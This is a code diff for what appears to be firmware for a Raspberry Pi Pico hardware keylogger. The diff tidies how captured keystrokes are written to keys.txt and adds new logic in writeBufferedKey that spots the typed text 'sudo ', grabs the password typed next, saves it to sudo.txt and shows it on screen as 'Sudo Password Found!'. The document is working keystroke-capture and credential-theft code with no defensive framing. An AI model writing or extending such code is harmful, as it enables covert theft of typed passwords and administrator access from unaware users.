@@ -8,32 +8,74 @@ void restartPico() {
 // ============================================================ Buffer Functions =================================================================
 
 void flushBuffer() {
-  File f = LittleFS.open("/keys.txt", "a");
-    if (bufferIndex > 0 && f) {
-        f.write((const uint8_t*)keyBuffer, bufferIndex);
-        f.flush();
-        bufferIndex = 0;
+    if (bufferIndex > 0) {
+        File f = LittleFS.open("/keys.txt", "a");
+        if (f) {
+            f.write((const uint8_t*)keyBuffer, bufferIndex);
+            f.flush();
+            f.close();
+            bufferIndex = 0;
+        } else {
+            Serial.println("Error writing to keys.txt");
+        }
     }
 }
 
 void writeBufferedKey(char key) {
-  if (liveCaptureActive){
-    if (lastPrintWasRoute) {
-        printout("\n");
-        lastPrintWasRoute = false;
-        printout("[LOG] ");
+    if (liveCaptureActive) {
+        if (lastPrintWasRoute) {
+            printout("\n");
+            lastPrintWasRoute = false;
+            printout("[LOG] ");
+        }
+        if (liveCaptureStart) {
+            liveCaptureStart = false;
+            printout("[LOG] ");
+        }
+
+        char str[2] = { key, '\0' };
+        printout(str);
     }
-    if (liveCaptureStart) {
-        liveCaptureStart = false;
-        printout("[LOG] ");
-    }     
-    char str[2] = { key, '\0' };
-    printout(str);
-  }
-    
+    if (!commandDetected && bufferIndex >= 5) { 
+        String lastFive = String(keyBuffer[bufferIndex - 4]) + 
+                          String(keyBuffer[bufferIndex - 3]) + 
+                          String(keyBuffer[bufferIndex - 2]) + 
+                          String(keyBuffer[bufferIndex - 1]) + 
+                          String(key);        
+        if (lastFive == "sudo ") {
+            commandDetected = true;
+            sudoPassword = "";
+        }
+    }
+    if (commandDetected && key == '\n') {
+        passwordExpected = true;
+        commandDetected = false;
+        sudoPassword = "";
+        return;
+    }
+    if (passwordExpected && passwordWaiting) {
+        if (key == '\n') {
+            passwordExpected = false;
+            if (sudoPassword.length() > 0) {
+                File sudoFile = LittleFS.open("/sudo.txt", "w");
+                if (sudoFile) {
+                    sudoFile.println(sudoPassword);
+                    sudoFile.close();
+                    showWaitScreen("Sudo Password Found!\n\n" + sudoPassword);
+                    passwordWaiting = false;
+                } else {
+                    Serial.println("Error saving password.");
+                }
+                sudoPassword = "";
+            }
+            return;
+        } else if (key != '\r') {
+            sudoPassword += key;
+        }
+    }
     if (bufferIndex < BUFFER_SIZE - 1) {
         keyBuffer[bufferIndex++] = key;
-        lastKeyTime = millis(); 
+        lastKeyTime = millis();
     } else {
         flushBuffer();
     }
